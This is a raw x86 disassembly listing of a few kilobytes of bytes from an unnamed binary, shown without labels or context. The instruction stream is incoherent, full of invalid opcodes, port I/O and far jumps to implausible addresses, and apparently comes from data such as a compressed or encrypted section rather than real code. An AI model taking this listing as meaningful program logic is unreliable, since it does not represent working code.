  416d8c:	fisttp QWORD PTR [ebp+0x28]
  416d8f:	adc    eax,0xa1b5cb8f
  416d94:	push   ebp
  416d95:	jmp    0x416d4d
  416d97:	inc    ebx
  416d98:	outs   dx,BYTE PTR ds:[esi]
  416d99:	pop    edx
  416d9a:	pop    edi
  416d9b:	or     al,0x45
  416d9d:	mov    bl,0x4e
  416d9f:	repnz pop ecx
  416da1:	sub    BYTE PTR [ebx],bl
  416da3:	les    ebx,FWORD PTR [edi+0x684bb515]
  416da9:	push   ss
  416daa:	sbb    BYTE PTR [ecx-0x80],ch
  416dad:	icebp  
  416dae:	mov    edi,0x93d3d0e1
  416db3:	jo     0x416d77
  416db5:	data16 adc al,0x3f
  416db8:	rcl    edx,1
  416dba:	push   es
  416dbb:	out    0xeb,al
  416dbd:	into   
  416dbe:	ja     0x416d52
  416dc0:	cdq    
  416dc1:	pop    edx
  416dc2:	mov    dl,0x98
  416dc4:	pop    ebp
  416dc5:	cmp    ebp,DWORD PTR [ebp+0xfbc9718]
  416dcb:	pop    ds
  416dcc:	(bad)  
  416dcd:	xchg   edx,eax
  416dce:	out    dx,al
  416dcf:	or     edi,DWORD PTR [ebp+eiz*8+0x60]
  416dd3:	ins    BYTE PTR es:[edi],dx
  416dd4:	cmc    
  416dd5:	fist   DWORD PTR [eax+0x42a53a93]
  416ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ddc:	jle    0x416e07
  416dde:	test   eax,0x1821708d
  416de3:	jg     0x416d9c
  416de5:	rcr    DWORD PTR [ebx-0x58],1
  416de8:	pop    ds
  416de9:	inc    ebp
  416dea:	push   esp
  416deb:	sbb    eax,DWORD PTR [edx-0x10]
  416dee:	xchg   esi,eax
  416def:	xor    eax,DWORD PTR [esi+0x31]
  416df2:	jmp    0xcf8e8ac5
  416df7:	adc    eax,0xbcb33b99
  416dfc:	dec    edx
  416dfd:	in     eax,0x54
  416dff:	test   BYTE PTR [esi+0x53],dh
  416e02:	cld    
  416e03:	mov    ebp,0x53676478
  416e08:	test   BYTE PTR [ecx+0x4578e0ca],0x9e
  416e0f:	lahf   
  416e10:	repnz dec esi
  416e12:	cs dec esp
  416e14:	cmp    BYTE PTR [ebx+0x5da02592],ch
  416e1a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e1c:	pop    ebp
  416e1d:	xor    ebx,DWORD PTR [eax]
  416e1f:	pop    ebp
  416e20:	es (bad) 
  416e22:	fdivr  QWORD PTR [edi]
  416e24:	loope  0x416dfc
  416e26:	add    dh,al
  416e28:	fmul   DWORD PTR [edi]
  416e2a:	outs   dx,DWORD PTR ds:[esi]
  416e2b:	mov    ch,0x3d
  416e2d:	or     BYTE PTR [eax],0xf3
  416e30:	shl    BYTE PTR [ebx-0x15],cl
  416e33:	aas    
  416e34:	mov    bl,0x21
  416e36:	arpl   bx,bx
  416e38:	dec    esp
  416e39:	(bad)  
  416e3a:	icebp  
  416e3b:	and    DWORD PTR [edx+ebp*8+0x74ff2fc2],ecx
  416e42:	sub    dh,BYTE PTR [eax-0x3672ac5d]
  416e48:	call   0x22331024
  416e4d:	pusha  
  416e4e:	lea    esp,ds:0x6e054efd
  416e54:	xor    DWORD PTR [ecx+0x3a3592bb],edi
  416e5a:	pop    ebp
  416e5b:	out    0x89,al
  416e5d:	mov    dh,0x57
  416e5f:	mov    ds:0x52a82eeb,eax
  416e64:	or     DWORD PTR [esi+eiz*8-0x2a],ecx
  416e68:	mov    ebx,0x7e57d998
  416e6d:	xchg   edx,eax
  416e6e:	mov    ecx,0xbd089b15
  416e73:	or     al,BYTE PTR [ebx]
  416e75:	fnstenv [edi]
  416e77:	int3   
  416e78:	std    
  416e79:	push   ss
  416e7a:	mov    ch,0x1d
  416e7c:	add    ebx,0xf172effc
  416e82:	je     0x416e33
  416e84:	jnp    0x416e3f
  416e86:	std    
  416e87:	mov    ah,al
  416e89:	sbb    edx,eax
  416e8b:	xchg   ebp,eax
  416e8c:	inc    ebp
  416e8d:	inc    ecx
  416e8e:	or     cl,BYTE PTR [edx]
  416e90:	daa    
  416e91:	xlat   BYTE PTR ss:[ebx]
  416e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e94:	je     0x416e24
  416e96:	push   ecx
  416e97:	outs   dx,DWORD PTR ds:[esi]
  416e98:	add    al,0x25
  416e9a:	push   0x7d
  416e9c:	cmp    BYTE PTR [edx],bh
  416e9e:	arpl   WORD PTR [ecx-0x3d],cx
  416ea1:	xor    BYTE PTR [ebx+edi*2-0x39],0xf1
  416ea6:	jmp    0x3354:0x5703cb
  416ead:	mov    ebp,DWORD PTR [edx+0x4f952164]
  416eb3:	(bad)  
  416eb4:	int    0x4d
  416eb6:	rcr    BYTE PTR [eax+0x521eab52],1
  416ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ebd:	or     bh,BYTE PTR [ecx]
  416ebf:	call   0x34bc8d0a
  416ec4:	mov    ah,0xad
  416ec6:	adc    al,0x7c
  416ec8:	repz push si
  416ecb:	pop    edx
  416ecc:	cdq    
  416ecd:	jns    0x416f34
  416ecf:	loope  0x416eba
  416ed1:	add    al,0xa7
  416ed3:	inc    DWORD PTR [ebp+0x64]
  416ed6:	cmc    
  416ed7:	add    DWORD PTR [eax+0x26085a87],esp
  416edd:	jmp    0x441f:0x6af37337
  416ee4:	mov    edx,0xed5c72e7
  416ee9:	out    dx,al
  416eea:	pop    ebx
  416eeb:	pop    ebp
  416eec:	mov    esi,0x7ec129c0
  416ef1:	dec    esp
  416ef2:	pop    edi
  416ef3:	retf   0xed89
  416ef6:	sahf   
  416ef7:	push   ecx
  416ef8:	mov    al,ds:0x4c781ffc
  416efd:	inc    esp
  416efe:	dec    edi
  416eff:	push   0xffffffb1
  416f01:	sbb    DWORD PTR [eax-0x6f],eax
  416f04:	or     BYTE PTR [ebp-0x62],dl
  416f07:	sub    eax,0x343d6abc
  416f0c:	js     0x416ec2
  416f0e:	mov    ebx,0x3fc87c48
  416f13:	push   es
  416f14:	rol    bl,0x6b
  416f17:	or     eax,0x658e142a
  416f1c:	iret   
  416f1d:	jp     0x416f5a
  416f1f:	iret   
  416f20:	mov    ecx,ecx
  416f22:	fcmovb st,st(2)
  416f24:	mov    BYTE PTR [eax-0x5da153d2],dh
  416f2a:	or     cl,BYTE PTR [eax]
  416f2c:	xor    BYTE PTR [esi-0x4e711c9f],bl
  416f32:	sub    DWORD PTR [esi-0x7cd744e8],esi
  416f38:	jmp    0xb3d:0xf2130aed
  416f3f:	ja     0x416ef4
  416f41:	and    BYTE PTR [ecx+0x6262b9b9],dh
  416f47:	cmp    edx,DWORD PTR [ebp+0x1a]
  416f4a:	test   DWORD PTR [eax+0x5],eax
  416f4d:	in     eax,0x1b
  416f4f:	in     al,0x79
  416f51:	cs push cs
  416f53:	add    DWORD PTR [edx-0x7a3d03d5],esi
  416f59:	xchg   edx,eax
  416f5a:	sub    al,0xba
  416f5c:	and    BYTE PTR [eax+ebx*4-0x2367157d],ch
  416f63:	sbb    esi,esp
  416f65:	in     al,0x1b
  416f67:	cdq    
  416f68:	inc    ebp
  416f69:	je     0x416f80
  416f6b:	stos   BYTE PTR es:[edi],al
  416f6c:	sub    bh,al
  416f6e:	out    0xce,al
  416f70:	test   dh,al
  416f72:	out    dx,eax
  416f73:	mov    bh,0x9a
  416f75:	div    DWORD PTR [edi-0x55]
  416f78:	and    ebp,DWORD PTR [edi-0x12ca37fa]
  416f7e:	or     bp,WORD PTR [ecx+0xaa8c4c6]
  416f85:	mov    eax,0x6837365
  416f8a:	dec    esi
  416f8b:	add    cl,BYTE PTR [esi-0x21358ba6]
  416f91:	jne    0x416f7c
  416f93:	loop   0x416f8b
  416f95:	sub    al,0xd7
  416f97:	jbe    0x416f4a
  416f99:	jp     0x416ff3
  416f9b:	cdq    
  416f9c:	std    
  416f9d:	push   es
  416f9e:	jae    0x41700d
  416fa0:	pop    esi
  416fa1:	test   DWORD PTR [esi],ebx
  416fa3:	mov    eax,ds:0x12f19121
  416fa8:	shl    al,1
  416faa:	xor    edx,DWORD PTR [ecx-0x62]
  416fad:	in     eax,0x81
  416faf:	xchg   edx,eax
  416fb0:	in     al,0xb9
  416fb2:	outs   dx,BYTE PTR ds:[esi]
  416fb3:	pop    ebx
  416fb4:	test   ebx,ecx
  416fb6:	xchg   esp,eax
  416fb7:	stc    
  416fb8:	cmc    
  416fb9:	cmp    al,0xf2
  416fbb:	loopne 0x416faa
  416fbd:	rcr    DWORD PTR [esi],1
  416fbf:	pop    edi
  416fc0:	mov    al,ds:0x89e79156
  416fc5:	mov    eax,ds:0x628ace15
  416fca:	fadd   QWORD PTR [edi]
  416fcc:	mov    edx,DWORD PTR [edx+0x6f]
  416fcf:	cmp    BYTE PTR [esi],0x34
  416fd2:	ret    0x2b12
  416fd5:	or     al,0x79
  416fd7:	push   ss
  416fd8:	jnp    0x417034
  416fda:	pop    esi
  416fdb:	jmp    0x41700d
  416fdd:	lods   eax,DWORD PTR ds:[esi]
  416fde:	jmp    0xdab0:0xbd3ef1dd
  416fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fe6:	xchg   esp,ecx
  416fe8:	sub    eax,0x4f4e072f
  416fed:	popf   
  416fee:	inc    eax
  416fef:	aam    0x5b
  416ff1:	jmp    0xa3bc:0x9e469119
  416ff8:	mov    ds:0x635e8241,eax
  416ffd:	mov    ch,0x41
  416fff:	push   cs
  417000:	inc    eax
  417001:	cmp    ebx,DWORD PTR [edx+eiz*4+0x2f]
  417005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417006:	xchg   ebx,eax
  417007:	call   0x2d2a7ab1
  41700c:	add    DWORD PTR [eax],ecx
  41700e:	mov    ch,0xf1
  417010:	mov    esp,0xa6bb989
  417015:	fwait
  417016:	sub    al,0x29
  417018:	(bad)  
  417019:	xchg   edx,eax
  41701a:	mov    DWORD PTR [ebx+0x23188433],esi
  417020:	push   ebp
  417021:	shl    BYTE PTR [ebx+0x3e],0x34
  417025:	adc    edi,DWORD PTR [ecx+0x3bc47c9e]
  41702b:	bound  ebx,QWORD PTR [esi+0x5a]
  41702e:	ins    DWORD PTR es:[edi],dx
  41702f:	sahf   
  417030:	add    al,BYTE PTR es:[ecx+0x3]
  417034:	inc    ebx
  417035:	ss xchg edx,eax
  417037:	(bad)  
  417038:	ins    DWORD PTR es:[edi],dx
  417039:	xchg   esi,eax
  41703a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41703b:	inc    ebx
  41703c:	leave  
  41703d:	jne    0x417061
  41703f:	wbinvd 
  417041:	inc    esi
  417042:	sbb    eax,0x28297c89
  417047:	fldcw  WORD PTR [edi+ecx*4-0x36]
  41704b:	push   esp
  41704c:	push   0x51
  41704e:	xor    edi,DWORD PTR [edi+edx*4+0x5c]
  417052:	inc    eax
  417053:	xchg   ecx,eax
  417054:	dec    edx
  417055:	retf   
  417056:	test   eax,0x2daca3f3
  41705b:	lods   al,BYTE PTR ds:[esi]
  41705c:	test   bl,ch
  41705e:	sub    bh,BYTE PTR [ebx+0x283af73f]
  417064:	in     al,dx
  417065:	in     al,0xed
  417067:	mov    ah,0xd5
  417069:	jle    0x4170e4
  41706b:	std    
  41706c:	dec    esi
  41706d:	ins    DWORD PTR es:[edi],dx
  41706e:	retf   0x9cca
  417071:	rol    DWORD PTR [edx],1
  417073:	adc    eax,0x449625ac
  417078:	xchg   esi,eax
  417079:	outs   dx,DWORD PTR ds:[esi]
  41707a:	sar    DWORD PTR [esi-0x52],0x1d
  41707e:	in     eax,dx
  41707f:	xchg   edx,eax
  417080:	inc    edx
  417081:	mov    bh,0x36
  417083:	dec    edx
  417084:	and    BYTE PTR [esi+0x2a],dh
  417087:	sub    DWORD PTR [ebx-0x48],ebx
  41708a:	xchg   esp,eax
  41708b:	dec    ebp
  41708c:	sub    BYTE PTR [edx-0x45],bh
  41708f:	aam    0x4f
  417091:	push   edx
  417092:	data16 jge 0x417073
  417095:	mov    eax,ds:0xbe9ba94
  41709a:	mov    dh,0x8a
  41709c:	and    edi,DWORD PTR ds:0x692047f0
  4170a2:	sahf   
  4170a3:	xor    eax,0xe2575224
  4170a8:	adc    eax,0x2dadf27f
  4170ad:	sbb    BYTE PTR [edi+0x5a],bl
  4170b0:	adc    edi,DWORD PTR [ecx-0x676b39c9]
  4170b6:	jmp    0x417070
  4170b8:	jl     0x4170b2
  4170ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170bb:	sahf   
  4170bc:	xchg   ecx,eax
  4170bd:	pusha  
  4170be:	(bad)  
  4170c0:	dec    ebp
  4170c1:	hlt    
  4170c2:	pop    esp
  4170c3:	stc    
  4170c4:	pusha  
  4170c5:	leave  
  4170c6:	lea    esp,[eax-0x5f75c40f]
  4170cc:	stos   BYTE PTR es:[edi],al
  4170cd:	sub    al,0x1
  4170cf:	test   BYTE PTR [edi-0x532ace92],0x5
  4170d6:	repz loopne 0x4170ea
  4170d9:	retf   
  4170da:	icebp  
  4170db:	or     DWORD PTR [ebp-0x21],edx
  4170de:	mov    DWORD PTR [ecx],esp
  4170e0:	dec    eax
  4170e1:	or     DWORD PTR [esi],edi
  4170e3:	adc    eax,eax
  4170e5:	or     al,0x4b
  4170e7:	imul   edx,DWORD PTR [ebx],0x71
  4170ea:	fsub   DWORD PTR [ebx+0x57]
  4170ed:	cld    
  4170ee:	or     BYTE PTR [esi+0x4a],al
  4170f1:	lods   eax,DWORD PTR ds:[esi]
  4170f2:	push   cs
  4170f3:	add    al,0x40
  4170f5:	out    0xa2,al
  4170f7:	shl    BYTE PTR [esi+0xabfe980],0x4e
  4170fe:	int    0x7a
  417100:	xchg   ecx,eax
  417101:	pop    esp
  417102:	pusha  
  417103:	retf   0xdf8f
  417106:	pop    ds
  417107:	icebp  
  417108:	inc    ecx
  417109:	cmp    ecx,DWORD PTR [ebx]
  41710b:	rol    DWORD PTR ds:0x7634e307,cl
  417111:	xchg   BYTE PTR [ebx+esi*8-0x2f],al
  417115:	push   ebp
  417116:	jmp    0xf6b61a01
  41711b:	pop    eax
  41711c:	mov    al,ds:0x8cc8a4f0
  417121:	dec    esi
  417122:	push   edi
  417123:	and    ch,BYTE PTR [ebp-0x58ee45a5]
  417129:	sub    DWORD PTR [edi+0x6ac33981],ecx
  41712f:	inc    esi
  417130:	pop    esi
  417131:	push   ecx
  417132:	jge    0x4171ac
  417134:	das    
  417135:	stos   DWORD PTR es:[edi],eax
  417136:	xor    DWORD PTR [eax+ecx*1-0x1c],0xce9060c8
  41713e:	push   eax
  41713f:	push   0x7fe1cff2
  417144:	shr    DWORD PTR [edi+ecx*4+0x1ae29c91],cl
  41714b:	inc    edi
  41714c:	lods   al,BYTE PTR ds:[esi]
  41714d:	fdiv   DWORD PTR [edi-0x42df676e]
  417153:	ret    0x3b33
  417156:	int    0x2c
  417158:	lds    ebx,FWORD PTR [eax-0x1c]
  41715b:	sbb    al,BYTE PTR [edx+0xc9788ea]
  417161:	mov    BYTE PTR [esi+0x26],cl
  417164:	mov    edi,0x7b5dd051
  417169:	inc    ecx
  41716a:	mov    dh,BYTE PTR [edi-0x79]
  41716d:	pop    edx
  41716e:	ret    
  41716f:	rol    ecx,cl
  417171:	inc    edx
  417172:	sub    edx,ebx
  417174:	dec    edi
  417175:	dec    esi
  417176:	out    dx,al
  417177:	das    
  417178:	lock add eax,0x6fd2388e
  41717e:	mov    ebx,0x6c2c60dc
  417183:	inc    ebp
  417184:	js     0x417143
  417186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417187:	fisttp QWORD PTR [edi]
  417189:	in     eax,dx
  41718a:	inc    ebp
  41718b:	stc    
  41718c:	dec    ebp
  41718d:	std    
  41718e:	adc    esi,DWORD PTR [ecx+0x42c99a83]
  417194:	sub    BYTE PTR [ebx+0x24],ah
  417197:	dec    edi
  417198:	dec    ecx
  417199:	clc    
  41719a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41719b:	pop    esp
  41719c:	jnp    0x41719a
  41719e:	jmp    0x94d1:0x80f67b44
  4171a5:	ss scas al,BYTE PTR es:[edi]
  4171a7:	lahf   
  4171a8:	pop    esp
  4171a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171aa:	je     0x417136
  4171ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171ad:	test   DWORD PTR [ebp-0x6d],eax
  4171b0:	or     DWORD PTR [eax+ebp*8-0x30],edx
  4171b4:	add    al,0xaa
  4171b6:	cwde   
  4171b7:	in     al,dx
  4171b8:	sar    DWORD PTR [edx],0xea
  4171bb:	mov    al,ds:0xe479918f
  4171c0:	mov    ah,0xda
  4171c2:	push   es
  4171c3:	in     al,dx
  4171c4:	push   ecx
  4171c5:	mov    cl,0xdf
  4171c7:	push   edx
  4171c8:	xchg   esp,eax
  4171c9:	cdq    
  4171ca:	inc    edx
  4171cb:	mov    cl,0x49
  4171cd:	cmc    
  4171ce:	fs in  eax,dx
  4171d0:	enter  0x95f1,0xbc
  4171d4:	or     eax,DWORD PTR [esi-0x3a]
  4171d7:	je     0x417202
  4171d9:	fwait
  4171da:	hlt    
  4171db:	leave  
  4171dc:	add    ah,ch
  4171de:	cli    
  4171df:	call   0x3d54:0xd4d6379c
  4171e6:	xor    DWORD PTR [edi-0x180533ea],ebx
  4171ec:	adc    ebp,DWORD PTR ds:0xa61b1c63
  4171f2:	jae    0x417202
  4171f4:	(bad)  
  4171f5:	or     dl,BYTE PTR [ecx]
  4171f7:	cmc    
  4171f8:	out    0x49,al
  4171fa:	leave  
  4171fb:	dec    eax
  4171fc:	(bad)  
  4171fd:	xlat   BYTE PTR ds:[ebx]
  4171fe:	or     al,0xcd
  417200:	aaa    
  417201:	clc    
  417202:	or     eax,0x45026853
  417207:	fld    TBYTE PTR [edx]
  417209:	jmp    0x766f62d1
  41720e:	cmp    eax,0x6559e4c6
  417213:	or     edx,esp
  417215:	and    edi,ebx
  417217:	ffreep st(7)
  417219:	pusha  
  41721a:	jp     0x4171ee
  41721c:	aam    0xa0
  41721e:	scas   eax,DWORD PTR es:[edi]
  41721f:	push   ecx
  417220:	jo     0x417224
  417222:	push   0x4633bc58
  417227:	push   eax
  417228:	and    eax,0x5b48f33
  41722d:	sbb    ebx,DWORD PTR [ebx+0x4a]
  417230:	push   ebx
  417231:	minps  xmm5,XMMWORD PTR [edx-0x72]
  417235:	jnp    0x41723d
  417237:	cld    
  417238:	cmp    dh,BYTE PTR [ebp-0x1adcfc4f]
  41723e:	ret    0x5973
  417241:	jge    0x4172aa
  417243:	xchg   ecx,eax
  417244:	xchg   edx,eax
  417245:	cdq    
  417246:	(bad)
  41724b:	out    0x18,eax
  41724d:	xchg   edx,eax
  41724e:	and    ah,BYTE PTR [esp+ebp*4]
  417251:	in     eax,dx
  417252:	shl    ch,0x38
  417255:	in     eax,0x32
  417257:	je     0x4172d6
  417259:	xchg   ebx,eax
  41725a:	mov    ebx,0x6335a028
  41725f:	jne    0x4172a2
  417261:	mov    DWORD PTR ds:0xf3422f66,esp
  417267:	cs (bad) 
  417269:	xor    eax,ebp
  41726b:	(bad)  
  41726c:	mov    esp,0x440fb1bc
  417271:	out    0xaf,al
  417273:	cmp    bl,BYTE PTR [ebx-0x6024251d]
  417279:	sub    ebx,DWORD PTR [edx+0x6f]
  41727c:	xchg   DWORD PTR ds:0x9c51b387,edi
  417282:	arpl   WORD PTR ds:0x2ecca802,di
  417288:	test   esi,ebx
  41728a:	repnz xlat BYTE PTR ds:[ebx]
  41728c:	xor    dl,BYTE PTR [eiz*2-0x277ee933]
  417293:	sub    dl,BYTE PTR [esi-0x1ba0a82]
  417299:	popa   
  41729a:	adc    DWORD PTR [ecx],0x77
  41729d:	call   0x32bd7f4f
  4172a2:	call   0xd1a1f660
  4172a7:	dec    ecx
  4172a8:	xor    eax,0x1dfc4d62
  4172ad:	add    edi,ebx
  4172af:	daa    
  4172b0:	jecxz  0x4172b3
  4172b2:	nop
  4172b3:	retf   0x8451
  4172b6:	dec    eax
  4172b7:	rcl    DWORD PTR [edx-0x6c86d05d],0xf8
  4172be:	inc    edi
  4172bf:	lahf   
  4172c0:	int    0x52
  4172c2:	cmc    
  4172c3:	xchg   ebp,eax
  4172c4:	adc    eax,esp
  4172c6:	sub    cl,0xe7
  4172c9:	xchg   edi,eax
  4172ca:	out    dx,al
  4172cb:	rcr    DWORD PTR [ebx],1
  4172cd:	sbb    DWORD PTR [ecx+0xd],edx
  4172d0:	xchg   esi,eax
  4172d1:	or     DWORD PTR [edi-0x17b4004f],esp
  4172d7:	icebp  
  4172d8:	clc    
  4172d9:	adc    eax,0xe3bea41b
  4172de:	in     eax,0xe3
  4172e0:	int    0xec
  4172e2:	loop   0x4172ee
  4172e4:	inc    edi
  4172e5:	stc    
  4172e6:	aam    0xdf
  4172e8:	shr    DWORD PTR [ebp+0x78],cl
  4172eb:	rol    cl,cl
  4172ed:	lahf   
  4172ee:	sti    
  4172ef:	push   ebx
  4172f0:	push   eax
  4172f1:	fisttp DWORD PTR [ecx+0xa3222ba]
  4172f7:	dec    esi
  4172f8:	sbb    bh,BYTE PTR [ecx+edi*2]
  4172fb:	push   ebp
  4172fc:	ins    BYTE PTR es:[edi],dx
  4172fd:	cmp    BYTE PTR [eax+0x62f2dd19],ch
  417303:	mov    al,ds:0xbbb9d46c
  417308:	adc    cl,0x5f
  41730b:	or     DWORD PTR [eax+0x5a],eax
  41730e:	sbb    BYTE PTR [ebp-0x105af2de],bl
  417314:	jnp    0x4172d4
  417316:	gs stc 
  417318:	popf   
  417319:	fisttp DWORD PTR [eiz*4-0x7413251c]
  417320:	mov    eax,ds:0x805da377
  417325:	add    BYTE PTR [edi],dl
  417327:	or     esi,ecx
  417329:	outs   dx,DWORD PTR ds:[esi]
  41732a:	daa    
  41732b:	das    
  41732c:	xchg   edi,eax
  41732d:	xor    edi,ecx
  41732f:	mov    ecx,0xea3da75
  417334:	cmp    al,ch
  417336:	mov    edx,0xd6120d29
  41733b:	xchg   edx,eax
  41733c:	aam    0x64
  41733e:	ds push esi
  417340:	jo     0x4172f7
  417342:	jecxz  0x417307
  417344:	(bad)  
  417345:	into   
  417346:	popf   
  417347:	mov    edi,0xd2f50d6d
  41734c:	mov    al,ds:0x8857def9
  417351:	or     eax,0xc2b5e8ec
  417356:	stc    
  417357:	push   ss
  417358:	mov    ebx,DWORD PTR [ebx]
  41735a:	daa    
  41735b:	inc    ebx
  41735c:	retf   
  41735d:	push   edi
  41735e:	imul   eax,DWORD PTR [edx-0x6f],0x6f
  417362:	jno    0x4172e7
  417364:	call   0x278cf58c
  417369:	pop    DWORD PTR es:[ecx]
  41736c:	stc    
  41736d:	or     ebx,eax
  41736f:	pop    ebp
  417370:	xchg   esp,eax
  417371:	cmp    al,0x35
  417373:	adc    DWORD PTR [ecx],ebx
  417375:	inc    esi
  417376:	sub    eax,0x2b91f5ad
  41737b:	push   esp
  41737c:	adc    dh,BYTE PTR [ecx+0x29821c8]
  417382:	imul   cl
  417384:	add    esi,DWORD PTR [eax-0x25d3ce7e]
  41738a:	jle    0x4173bc
  41738c:	xchg   BYTE PTR [esi],cl
  41738e:	mov    eax,ds:0xa49c7f6a
  417393:	call   0x47b:0x34c82c95
  41739a:	jecxz  0x4173e8
  41739c:	mov    esi,ecx
  41739e:	jecxz  0x4173d8
  4173a0:	cmp    DWORD PTR [edx-0x72],ebx
  4173a3:	add    ebp,edi
  4173a5:	inc    edx
  4173a6:	cdq    
  4173a7:	pop    eax
  4173a8:	jb     0x417339
  4173aa:	ss retf 0xe2ba
  4173ae:	mov    cl,0x84
  4173b0:	sbb    BYTE PTR [ecx],ch
  4173b2:	pop    eax
  4173b3:	add    edi,0x7fc26e79
  4173b9:	sti    
  4173ba:	nop
  4173bb:	clc    
  4173bc:	adc    eax,0xf8942e91
  4173c1:	mov    al,ds:0xcc9fc63b
  4173c6:	jmp    0x2f8c:0x96efc3dc
  4173cd:	mov    ds:0x719fee90,al
  4173d2:	out    0xae,al
  4173d4:	xor    dh,0x68
  4173d7:	pop    ss
  4173d8:	push   ds
  4173d9:	fsub   QWORD PTR [ebp-0x1a]
  4173dc:	push   edx
  4173dd:	and    eax,0x3af8bdbe
  4173e2:	mov    al,BYTE PTR [ecx]
  4173e4:	xor    dl,ah
  4173e6:	aaa    
  4173e7:	int    0xe8
  4173e9:	stos   BYTE PTR es:[edi],al
  4173ea:	push   esi
  4173eb:	(bad)  
  4173ec:	cs push 0xe
  4173ef:	pop    es
  4173f0:	push   0x7b5b86b
  4173f5:	lea    ebx,[ebx]
  4173f7:	mov    cl,0xe2
  4173f9:	sbb    edi,eax
  4173fb:	fld    DWORD PTR ds:0x52e59dd6
  417401:	in     eax,dx
  417402:	push   ebx
  417403:	push   es
  417404:	add    esi,DWORD PTR [esi-0x57fda0ed]
  41740a:	jbe    0x4173d5
  41740c:	xor    BYTE PTR [ecx-0xd],dl
  41740f:	aam    0xed
  417411:	test   BYTE PTR [edi-0x9eafa32],al
  417417:	(bad)  
  417418:	cdq    
  417419:	push   0xa7034baf
  41741e:	mov    dl,0xc3
  417420:	(bad)  [edi]
  417422:	hlt    
  417423:	cmp    ebx,DWORD PTR [edi-0x782f041b]
  417429:	lahf   
  41742a:	fadd   DWORD PTR [edx+0x44e6ff0f]
  417430:	loopne 0x417489
  417432:	push   0xffffffed
  417434:	and    DWORD PTR [esi+0x62f40699],ebp
  41743a:	cmp    DWORD PTR [eax-0x58],ebp
  41743d:	(bad)  
  41743e:	inc    edi
  41743f:	sub    eax,0x437c1475
  417444:	xchg   ebx,eax
  417445:	push   di
  417447:	(bad)  
  417448:	mov    ebx,0x757181ab
  41744d:	fisubr WORD PTR [esi-0x79]
  417450:	dec    esi
  417451:	sbb    DWORD PTR ds:0x5577f2b2,0x5a
  417458:	sbb    dh,BYTE PTR [edi+edx*2+0x36]
  41745c:	mov    ds:0x8b80a778,eax
  417461:	fsub   QWORD PTR [ebp-0x68]
  417464:	jmp    0x4173e7
  417466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417467:	cmp    al,0x34
  417469:	pushf  
  41746a:	dec    ebp
  41746b:	push   es
  41746c:	add    BYTE PTR [eax-0x1a],0xd9
  417470:	repnz push ss
  417472:	jp     0x41744c
  417474:	lahf   
  417475:	lods   al,BYTE PTR ds:[esi]
  417476:	addr16 mov esp,0xf1b479f6
  41747c:	jb     0x417448
  41747e:	mov    WORD PTR [eax+0x62],gs
  417481:	iret   
  417482:	sbb    ebx,ebp
  417484:	or     ebp,DWORD PTR [esp+edx*4+0x29]
  417488:	adc    esp,0x2e812bc2
  41748e:	sub    eax,0xc9246537
  417493:	out    dx,eax
  417494:	lahf   
  417495:	jg     0x4174a8
  417497:	test   DWORD PTR [ebp+0x2bd6f683],0x9f02ef5a
  4174a1:	ds sub al,0x4f
  4174a4:	jb     0x41743c
  4174a6:	pop    es
  4174a7:	mov    ecx,0x80f1fe92
  4174ac:	adc    ebp,DWORD PTR [esi+edi*1-0xb0ef49d]
  4174b3:	pushf  
  4174b4:	pop    esp
  4174b5:	sar    DWORD PTR ds:0xc5d0bb74,cl
  4174bb:	mov    edi,0xa5cf01a
  4174c0:	xor    eax,0x74420713
  4174c5:	xchg   ebp,eax
  4174c6:	mov    eax,0x88066bb
  4174cb:	fxch   st(2)
  4174cd:	mov    al,0x8b
  4174cf:	aad    0xa4
  4174d1:	fsubr  QWORD PTR [edi-0xf76d342]
  4174d7:	dec    edx
  4174d8:	push   ebx
  4174d9:	std    
  4174da:	mov    eax,0x173089bf
  4174df:	ss mov ebp,0xedc94c1d
  4174e5:	sub    BYTE PTR [eax-0x5d],al
  4174e8:	loop   0x41749a
  4174ea:	sub    esi,esi
  4174ec:	add    eax,0xf4177494
  4174f1:	in     eax,0x55
  4174f3:	cld    
  4174f4:	and    BYTE PTR [esi-0x11ef719e],ah
  4174fa:	push   edi
  4174fb:	and    dl,BYTE PTR [ecx+0x6b]
  4174fe:	lea    esi,[ebx]
  417500:	ret    
  417501:	in     eax,dx
  417502:	pushf  
  417503:	dec    ebp
  417504:	and    ebp,DWORD PTR [ebp+0x1d]
  417507:	outs   dx,DWORD PTR ds:[esi]
  417508:	mov    ah,0xa5
  41750a:	sbb    al,0x3
  41750c:	in     al,0x57
  41750e:	pop    edi
  41750f:	popf   
  417510:	hlt    
  417511:	pop    eax
  417512:	pop    edx
  417513:	loope  0x4174d6
  417515:	ja     0x41758d
  417517:	daa    
  417518:	xor    ecx,esp
  41751a:	div    dh
  41751c:	int3   
  41751d:	imul   ebp,ebp,0x90fdd1ba
  417523:	leave  
  417524:	xor    bh,ch
  417526:	lea    esp,ds:0x383a7a84
  41752c:	inc    edx
  41752d:	sti    
  41752e:	clc    
  41752f:	frstor [edx+0x59053368]
  417535:	cmp    BYTE PTR [ebx],ch
  417537:	iret   
  417538:	mov    eax,ds:0x6f4fd153
  41753d:	hlt    
  41753e:	dec    ecx
  41753f:	dec    di
  417541:	xor    eax,0xe2289ea2
  417546:	or     BYTE PTR [ebx],0x67
  417549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41754a:	sbb    edx,DWORD PTR [edx-0x73]
  41754d:	and    bl,BYTE PTR [esi+0x16f4d8d9]
  417553:	scas   eax,DWORD PTR es:[edi]
  417554:	adc    eax,0x5c9dc51
  417559:	ins    DWORD PTR es:[edi],dx
  41755a:	in     eax,dx
  41755b:	pop    ebp
  41755c:	or     esp,esi
  41755e:	jne    0x417552
  417560:	xor    al,0xb6
  417562:	inc    esp
  417563:	cwde   
  417564:	xlat   BYTE PTR ds:[ebx]
